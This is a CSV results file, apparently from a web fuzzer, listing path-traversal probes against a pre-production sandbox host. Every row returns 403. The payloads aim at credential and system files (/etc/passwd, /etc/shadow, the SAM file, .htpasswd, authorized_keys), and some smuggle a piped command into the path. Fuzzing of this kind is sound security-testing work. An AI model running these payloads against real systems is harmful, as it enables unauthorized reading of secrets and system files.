FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,https://app-preprod-sandbox.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,27.712934ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,https://app-preprod-sandbox.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,31.828916ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,https://app-preprod-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,,36688,403,312,17,7,text/html; charset=us-ascii,27.91147ms,
../.pass,https://app-preprod-sandbox.officevibe.com/../.pass,,37462,403,312,17,7,text/html; charset=us-ascii,27.382415ms,
../.passwd,https://app-preprod-sandbox.officevibe.com/../.passwd,,37467,403,312,17,7,text/html; charset=us-ascii,27.814909ms,
info2www '(../../../../../../../bin/mail root </etc/passwd>,https://app-preprod-sandbox.officevibe.com/info2www '(../../../../../../../bin/mail root </etc/passwd>,,38767,403,312,17,7,text/html; charset=us-ascii,27.701997ms,
../../../../../logs/access.log,https://app-preprod-sandbox.officevibe.com/../../../../../logs/access.log,,38985,403,312,17,7,text/html; charset=us-ascii,27.701307ms,
"cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://app-preprod-sandbox.officevibe.com/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,39476,403,312,17,7,text/html; charset=us-ascii,27.389402ms,
../../apache/logs/error.log,https://app-preprod-sandbox.officevibe.com/../../apache/logs/error.log,,40906,403,312,17,7,text/html; charset=us-ascii,30.525157ms,
../../../logs/access.log,https://app-preprod-sandbox.officevibe.com/../../../logs/access.log,,45696,403,312,17,7,text/html; charset=us-ascii,29.272948ms,
../../logs/access.log,https://app-preprod-sandbox.officevibe.com/../../logs/access.log,,50318,403,312,17,7,text/html; charset=us-ascii,27.460279ms,
../../../../../logs/error.log,https://app-preprod-sandbox.officevibe.com/../../../../../logs/error.log,,51110,403,312,17,7,text/html; charset=us-ascii,28.603205ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://app-preprod-sandbox.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,52401,403,312,17,7,text/html; charset=us-ascii,27.859456ms,
..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,https://app-preprod-sandbox.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,,52408,403,312,17,7,text/html; charset=us-ascii,27.51647ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,https://app-preprod-sandbox.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,,53350,403,312,17,7,text/html; charset=us-ascii,27.523305ms,
cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://app-preprod-sandbox.officevibe.com/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,53439,403,312,17,7,text/html; charset=us-ascii,28.695557ms,
static/..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/static/..%5c..%5cetc/passwd,,54184,403,312,17,7,text/html; charset=us-ascii,27.650583ms,
..//etc/passwd;index.html,https://app-preprod-sandbox.officevibe.com/..//etc/passwd;index.html,,55856,403,312,17,7,text/html; charset=us-ascii,27.376993ms,
css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://app-preprod-sandbox.officevibe.com/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,56912,403,312,17,7,text/html; charset=us-ascii,27.94041ms,
..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,57302,403,312,17,7,text/html; charset=us-ascii,27.577944ms,
cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://app-preprod-sandbox.officevibe.com/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,57730,403,312,17,7,text/html; charset=us-ascii,32.888756ms,
//../../data/config/microsrv.cfg,https://app-preprod-sandbox.officevibe.com///../../data/config/microsrv.cfg,,63058,403,312,17,7,text/html; charset=us-ascii,27.220758ms,
../../apache/logs/access.log,https://app-preprod-sandbox.officevibe.com/../../apache/logs/access.log,,65127,403,312,17,7,text/html; charset=us-ascii,27.840424ms,
..\\..\\..\\..\\..\\..\\..\\boot.ini,https://app-preprod-sandbox.officevibe.com/..\\..\\..\\..\\..\\..\\..\\boot.ini,,65982,403,312,17,7,text/html; charset=us-ascii,27.940608ms,
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://app-preprod-sandbox.officevibe.com/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,67936,403,312,17,7,text/html; charset=us-ascii,28.060365ms,
static/..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5cetc/passwd,,70464,403,312,17,7,text/html; charset=us-ascii,27.872134ms,
../webserver.ini,https://app-preprod-sandbox.officevibe.com/../webserver.ini,,73462,403,312,17,7,text/html; charset=us-ascii,27.029794ms,
xyz/../../ThinVnc.ini,https://app-preprod-sandbox.officevibe.com/xyz/../../ThinVnc.ini,,74299,403,312,17,7,text/html; charset=us-ascii,27.712421ms,
static/../../../a/../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/static/../../../a/../../../../etc/passwd,,74451,403,312,17,7,text/html; charset=us-ascii,27.996114ms,
static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,77730,403,312,17,7,text/html; charset=us-ascii,27.537905ms,
..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5cetc/passwd,,78884,403,312,17,7,text/html; charset=us-ascii,28.348636ms,
../../logs/error.log,https://app-preprod-sandbox.officevibe.com/../../logs/error.log,,84935,403,312,17,7,text/html; charset=us-ascii,41.166046ms,
static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,88703,403,312,17,7,text/html; charset=us-ascii,27.726434ms,
static/../../../../windows/win.ini.,https://app-preprod-sandbox.officevibe.com/static/../../../../windows/win.ini.,,88730,403,312,17,7,text/html; charset=us-ascii,36.585527ms,
..//..///etc/passwd,https://app-preprod-sandbox.officevibe.com/..//..///etc/passwd,,89982,403,312,17,7,text/html; charset=us-ascii,28.002253ms,
..\..\..\..\..\..\temp\temp.class,https://app-preprod-sandbox.officevibe.com/..\..\..\..\..\..\temp\temp.class,,91616,403,312,17,7,text/html; charset=us-ascii,27.949261ms,
../manager/text,https://app-preprod-sandbox.officevibe.com/../manager/text,,91797,403,312,17,7,text/html; charset=us-ascii,27.597774ms,
..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/..%5c..%5cetc/passwd,,93430,403,312,17,7,text/html; charset=us-ascii,28.298352ms,
../../../../apache/logs/error.log,https://app-preprod-sandbox.officevibe.com/../../../../apache/logs/error.log,,93634,403,312,17,7,text/html; charset=us-ascii,28.051802ms,
..////etc/passwd,https://app-preprod-sandbox.officevibe.com/..////etc/passwd,,94975,403,312,17,7,text/html; charset=us-ascii,27.799468ms,
../../../../../../../../../../WINNT/system32/ipconfig.exe,https://app-preprod-sandbox.officevibe.com/../../../../../../../../../../WINNT/system32/ipconfig.exe,,95676,403,312,17,7,text/html; charset=us-ascii,27.698098ms,
.//..///etc/passwd,https://app-preprod-sandbox.officevibe.com/.//..///etc/passwd,,96809,403,312,17,7,text/html; charset=us-ascii,27.719772ms,
../../../.htaccess,https://app-preprod-sandbox.officevibe.com/../../../.htaccess,,98837,403,312,17,7,text/html; charset=us-ascii,27.94888ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,https://app-preprod-sandbox.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,,99167,403,312,17,7,text/html; charset=us-ascii,28.354655ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,https://app-preprod-sandbox.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,,99682,403,312,17,7,text/html; charset=us-ascii,27.586249ms,
../html,https://app-preprod-sandbox.officevibe.com/../html,,100072,403,312,17,7,text/html; charset=us-ascii,28.242491ms,
../config.php,https://app-preprod-sandbox.officevibe.com/../config.php,,102518,403,312,17,7,text/html; charset=us-ascii,27.850778ms,
jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,,104832,403,312,17,7,text/html; charset=us-ascii,28.004035ms,
res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://app-preprod-sandbox.officevibe.com/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,107746,403,312,17,7,text/html; charset=us-ascii,27.990793ms,
../users.db.php,https://app-preprod-sandbox.officevibe.com/../users.db.php,,108705,403,312,17,7,text/html; charset=us-ascii,27.702624ms,
../apache/logs/error.log,https://app-preprod-sandbox.officevibe.com/../apache/logs/error.log,,108758,403,312,17,7,text/html; charset=us-ascii,27.8162ms,
my_keys&dst=../../../root/.ssh/authorized_keys,https://app-preprod-sandbox.officevibe.com/my_keys&dst=../../../root/.ssh/authorized_keys,,109041,403,312,17,7,text/html; charset=us-ascii,28.00354ms,
signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,,111191,403,312,17,7,text/html; charset=us-ascii,27.679192ms,
ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,https://app-preprod-sandbox.officevibe.com/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,,112444,403,312,17,7,text/html; charset=us-ascii,32.586645ms,
votes/../../admin/multiuser/multiuser.php,https://app-preprod-sandbox.officevibe.com/votes/../../admin/multiuser/multiuser.php,,112576,403,312,17,7,text/html; charset=us-ascii,28.456003ms,
ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,https://app-preprod-sandbox.officevibe.com/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,,114224,403,312,17,7,text/html; charset=us-ascii,35.046569ms,
../../proc,https://app-preprod-sandbox.officevibe.com/../../proc,,125026,403,312,17,7,text/html; charset=us-ascii,28.010804ms,
[SecCheck]/..%2f../ext.ini,https://app-preprod-sandbox.officevibe.com/[SecCheck]/..%2f../ext.ini,,127572,403,312,17,7,text/html; charset=us-ascii,32.359227ms,
admin/../../../file/to/view,https://app-preprod-sandbox.officevibe.com/admin/../../../file/to/view,,128723,403,312,17,7,text/html; charset=us-ascii,27.428051ms,
../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/../../../../etc/passwd,,130010,403,312,17,7,text/html; charset=us-ascii,27.101773ms,
"tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://app-preprod-sandbox.officevibe.com/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,134096,403,312,17,7,text/html; charset=us-ascii,29.135275ms,
../../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/../../../../../etc/passwd,,134649,403,312,17,7,text/html; charset=us-ascii,27.213404ms,
../../var/www/logs/access_log,https://app-preprod-sandbox.officevibe.com/../../var/www/logs/access_log,,136450,403,312,17,7,text/html; charset=us-ascii,27.189828ms,
NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://app-preprod-sandbox.officevibe.com/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,137428,403,312,17,7,text/html; charset=us-ascii,28.026205ms,
../../../../pswd,https://app-preprod-sandbox.officevibe.com/../../../../pswd,,139151,403,312,17,7,text/html; charset=us-ascii,27.652189ms,
../../..//etc/passwd,https://app-preprod-sandbox.officevibe.com/../../..//etc/passwd,,145383,403,312,17,7,text/html; charset=us-ascii,28.069883ms,
../../../../../../../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/../../../../../../../../../../etc/passwd,,149904,403,312,17,7,text/html; charset=us-ascii,27.997269ms,
\..\..\..\..\..\..\..\..\..\etc\passwd,https://app-preprod-sandbox.officevibe.com/\..\..\..\..\..\..\..\..\..\etc\passwd,,149962,403,312,17,7,text/html; charset=us-ascii,27.826432ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,https://app-preprod-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,,150077,403,312,17,7,text/html; charset=us-ascii,28.149442ms,
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,https://app-preprod-sandbox.officevibe.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,150783,403,312,17,7,text/html; charset=us-ascii,27.68172ms,
../logs/error.log,https://app-preprod-sandbox.officevibe.com/../logs/error.log,,150787,403,312,17,7,text/html; charset=us-ascii,28.390011ms,
../_config.php,https://app-preprod-sandbox.officevibe.com/../_config.php,,152532,403,312,17,7,text/html; charset=us-ascii,30.539496ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,https://app-preprod-sandbox.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,,152732,403,312,17,7,text/html; charset=us-ascii,27.521021ms,
../../../../winnt/repair/sam._,https://app-preprod-sandbox.officevibe.com/../../../../winnt/repair/sam._,,152901,403,312,17,7,text/html; charset=us-ascii,27.621035ms,
//./../.../boot.ini,https://app-preprod-sandbox.officevibe.com///./../.../boot.ini,,154859,403,312,17,7,text/html; charset=us-ascii,27.521738ms,
../.htaccess,https://app-preprod-sandbox.officevibe.com/../.htaccess,,154866,403,312,17,7,text/html; charset=us-ascii,27.606774ms,
a\..\..\muster.db,https://app-preprod-sandbox.officevibe.com/a\..\..\muster.db,,155201,403,312,17,7,text/html; charset=us-ascii,28.903657ms,
./../../../../../../../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/./../../../../../../../../../../etc/passwd,,158810,403,312,17,7,text/html; charset=us-ascii,27.795717ms,
../etc/passwd,https://app-preprod-sandbox.officevibe.com/../etc/passwd,,161332,403,312,17,7,text/html; charset=us-ascii,27.84452ms,
../../../apache/logs/access.log,https://app-preprod-sandbox.officevibe.com/../../../apache/logs/access.log,,165596,403,312,17,7,text/html; charset=us-ascii,27.599044ms,
RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,https://app-preprod-sandbox.officevibe.com/RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,,168885,403,312,17,7,text/html; charset=us-ascii,27.369714ms,
./../../../../../../../../../../etc/shadow,https://app-preprod-sandbox.officevibe.com/./../../../../../../../../../../etc/shadow,,170300,403,312,17,7,text/html; charset=us-ascii,28.000514ms,
../config.dat,https://app-preprod-sandbox.officevibe.com/../config.dat,,175059,403,312,17,7,text/html; charset=us-ascii,27.924755ms,
../apache/logs/access.log,https://app-preprod-sandbox.officevibe.com/../apache/logs/access.log,,175197,403,312,17,7,text/html; charset=us-ascii,28.012182ms,
../www,https://app-preprod-sandbox.officevibe.com/../www,,175254,403,312,17,7,text/html; charset=us-ascii,27.353908ms,
../config.asp,https://app-preprod-sandbox.officevibe.com/../config.asp,,179031,403,312,17,7,text/html; charset=us-ascii,27.675169ms,
./.././..//etc/passwd,https://app-preprod-sandbox.officevibe.com/./.././..//etc/passwd,,181131,403,312,17,7,text/html; charset=us-ascii,28.818476ms,
..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,https://app-preprod-sandbox.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,,183471,403,312,17,7,text/html; charset=us-ascii,27.397978ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,https://app-preprod-sandbox.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,,186200,403,312,17,7,text/html; charset=us-ascii,29.010641ms,
../.htpasswd,https://app-preprod-sandbox.officevibe.com/../.htpasswd,,186603,403,312,17,7,text/html; charset=us-ascii,28.256267ms,
lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://app-preprod-sandbox.officevibe.com/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,188596,403,312,17,7,text/html; charset=us-ascii,28.041269ms,
../..//etc/passwd,https://app-preprod-sandbox.officevibe.com/../..//etc/passwd,,193029,403,312,17,7,text/html; charset=us-ascii,27.526258ms,
static/../../../../windows/win.ini,https://app-preprod-sandbox.officevibe.com/static/../../../../windows/win.ini,,201012,403,312,17,7,text/html; charset=us-ascii,27.96029ms,
%2e%2e//google.com,https://app-preprod-sandbox.officevibe.com/%2e%2e//google.com,,202957,403,312,17,7,text/html; charset=us-ascii,27.022007ms,
../../../..//etc/passwd;index.html,https://app-preprod-sandbox.officevibe.com/../../../..//etc/passwd;index.html,,203432,403,312,17,7,text/html; charset=us-ascii,28.484675ms,
modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,https://app-preprod-sandbox.officevibe.com/modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,,206747,403,312,17,7,text/html; charset=us-ascii,29.005613ms,
/./../.../boot.ini,https://app-preprod-sandbox.officevibe.com//./../.../boot.ini,,208978,403,312,17,7,text/html; charset=us-ascii,27.714513ms,
../config.inc.php,https://app-preprod-sandbox.officevibe.com/../config.inc.php,,211520,403,312,17,7,text/html; charset=us-ascii,27.12372ms,
../manager/html,https://app-preprod-sandbox.officevibe.com/../manager/html,,213723,403,312,17,7,text/html; charset=us-ascii,32.488486ms,
../../../../apache/logs/access.log,https://app-preprod-sandbox.officevibe.com/../../../../apache/logs/access.log,,214776,403,312,17,7,text/html; charset=us-ascii,29.271655ms,
../admim,https://app-preprod-sandbox.officevibe.com/../admim,,217845,403,312,17,7,text/html; charset=us-ascii,27.800311ms,
..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,https://app-preprod-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,,218082,403,312,17,7,text/html; charset=us-ascii,27.424119ms,
../../../../logs/access.log,https://app-preprod-sandbox.officevibe.com/../../../../logs/access.log,,222807,403,312,17,7,text/html; charset=us-ascii,28.381291ms,
js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://app-preprod-sandbox.officevibe.com/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,224364,403,312,17,7,text/html; charset=us-ascii,27.577836ms,
"alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://app-preprod-sandbox.officevibe.com/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,226017,403,312,17,7,text/html; charset=us-ascii,28.050761ms,
../../etc/passwd,https://app-preprod-sandbox.officevibe.com/../../etc/passwd,,226249,403,312,17,7,text/html; charset=us-ascii,27.392061ms,
static/..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5cetc/passwd,,226291,403,312,17,7,text/html; charset=us-ascii,27.709474ms,
//////../../../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com///////../../../../../../etc/passwd,,226989,403,312,17,7,text/html; charset=us-ascii,27.547429ms,
"cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://app-preprod-sandbox.officevibe.com/cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,228125,403,312,17,7,text/html; charset=us-ascii,28.03173ms,
../../data/config/microsrv.cfg,https://app-preprod-sandbox.officevibe.com/../../data/config/microsrv.cfg,,228343,403,312,17,7,text/html; charset=us-ascii,27.283848ms,
../../..//etc/passwd;index.html,https://app-preprod-sandbox.officevibe.com/../../..//etc/passwd;index.html,,233973,403,312,17,7,text/html; charset=us-ascii,28.364815ms,
../..//etc/passwd;index.html,https://app-preprod-sandbox.officevibe.com/../..//etc/passwd;index.html,,239233,403,312,17,7,text/html; charset=us-ascii,32.106512ms,
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,https://app-preprod-sandbox.officevibe.com/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,,241360,403,312,17,7,text/html; charset=us-ascii,28.838751ms,
..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,243557,403,312,17,7,text/html; charset=us-ascii,27.750184ms,
../../../../../../../../../boot.ini,https://app-preprod-sandbox.officevibe.com/../../../../../../../../../boot.ini,,245648,403,312,17,7,text/html; charset=us-ascii,27.957732ms,
../console,https://app-preprod-sandbox.officevibe.com/../console,,250034,403,312,17,7,text/html; charset=us-ascii,27.641044ms,
../../windows/win.ini,https://app-preprod-sandbox.officevibe.com/../../windows/win.ini,,253997,403,312,17,7,text/html; charset=us-ascii,28.707556ms,
../../../administrator/inbox,https://app-preprod-sandbox.officevibe.com/../../../administrator/inbox,,255033,403,312,17,7,text/html; charset=us-ascii,27.76865ms,
static/..%5c..%5c..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5c..%5cetc/passwd,,255283,403,312,17,7,text/html; charset=us-ascii,30.876586ms,
dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,https://app-preprod-sandbox.officevibe.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,,258795,403,312,17,7,text/html; charset=us-ascii,27.55567ms,
../../../../logs/error.log,https://app-preprod-sandbox.officevibe.com/../../../../logs/error.log,,259632,403,312,17,7,text/html; charset=us-ascii,28.403989ms,
../../.htaccess,https://app-preprod-sandbox.officevibe.com/../../.htaccess,,263185,403,312,17,7,text/html; charset=us-ascii,27.619182ms,
..%5c..%5c..%5cetc/passwd,https://app-preprod-sandbox.officevibe.com/..%5c..%5c..%5cetc/passwd,,263409,403,312,17,7,text/html; charset=us-ascii,36.23215ms,
../../../apache/logs/error.log,https://app-preprod-sandbox.officevibe.com/../../../apache/logs/error.log,,265724,403,312,17,7,text/html; charset=us-ascii,28.189555ms,
../../../..//etc/passwd,https://app-preprod-sandbox.officevibe.com/../../../..//etc/passwd,,266700,403,312,17,7,text/html; charset=us-ascii,31.475353ms,
../logs/access.log,https://app-preprod-sandbox.officevibe.com/../logs/access.log,,270935,403,312,17,7,text/html; charset=us-ascii,27.845898ms,
DomainFiles/*//../../../../../../../../../../etc/passwd,https://app-preprod-sandbox.officevibe.com/DomainFiles/*//../../../../../../../../../../etc/passwd,,273573,403,312,17,7,text/html; charset=us-ascii,27.166319ms,
../agc/bp.pl,https://app-preprod-sandbox.officevibe.com/../agc/bp.pl,,276301,403,312,17,7,text/html; charset=us-ascii,28.166542ms,
../install.php,https://app-preprod-sandbox.officevibe.com/../install.php,,279316,403,312,17,7,text/html; charset=us-ascii,28.164674ms,
./..//etc/passwd,https://app-preprod-sandbox.officevibe.com/./..//etc/passwd,,281572,403,312,17,7,text/html; charset=us-ascii,27.737789ms,
.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,https://app-preprod-sandbox.officevibe.com/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,,282407,403,312,17,7,text/html; charset=us-ascii,28.159905ms,
